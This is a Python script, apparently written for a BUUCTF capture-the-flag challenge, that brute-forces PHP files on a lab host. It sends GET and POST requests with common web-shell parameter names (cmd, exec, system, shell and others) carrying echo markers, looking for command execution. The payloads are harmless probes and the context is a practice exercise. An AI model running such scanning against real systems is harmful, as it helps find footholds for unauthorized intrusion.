#!/usr/bin/env python3
"""
暴力测试：对每个文件发送命令执行请求
"""
import os
import requests
import time
import random
import string

BASE_URL = "http://01de7a39-b84f-4e29-afb6-cc13ed331efc.node5.buuoj.cn:81"
SRC_DIR = "src"
DELAY = 0.2

def generate_marker():
    return ''.join(random.choices(string.ascii_uppercase + string.digits, k=10))

def test_file(php_file):
    """测试单个PHP文件"""
    marker = generate_marker()
    url = f"{BASE_URL}/{php_file}"
    
    # 尝试不同的参数名和payload组合
    test_params = [
        # GET参数
        {'cmd': f'echo {marker}'},
        {'c': f'echo {marker}'},
        {'command': f'echo {marker}'},
        {'exec': f'echo {marker}'},
        {'system': f'echo {marker}'},
        {'shell': f'echo {marker}'},
        {'code': f'echo "{marker}";'},
        {'a': f'echo {marker}'},
        {'x': f'echo {marker}'},
        {'p': f'echo {marker}'},
    ]
    
    for params in test_params:
        try:
            r = requests.get(url, params=params, timeout=5)
            if r.status_code == 429:
                time.sleep(30)
                continue
            if marker in r.text:
                return True, params, marker
        except:
            pass
        time.sleep(DELAY)
    
    # 尝试POST参数
    for params in test_params:
        try:
            r = requests.post(url, data=params, timeout=5)
            if r.status_code == 429:
                time.sleep(30)
                continue
            if marker in r.text:
                return True, params, marker
        except:
            pass
        time.sleep(DELAY)
    
    return False, None, None

def main():
    php_files = [f for f in os.listdir(SRC_DIR) if f.endswith('.php')]
    random.shuffle(php_files)  # 随机顺序
    
    for i, php_file in enumerate(php_files):
        result, params, marker = test_file(php_file)
        if result:
            print(f"\n[+] FOUND: {php_file}")
            print(f"    Params: {params}")
            print(f"    Marker: {marker}")
            return php_file, params
        
        if i % 100 == 0:
            print(f"[*] Tested {i}/{len(php_files)} files...")
    
    return None

if __name__ == "__main__":
    main()
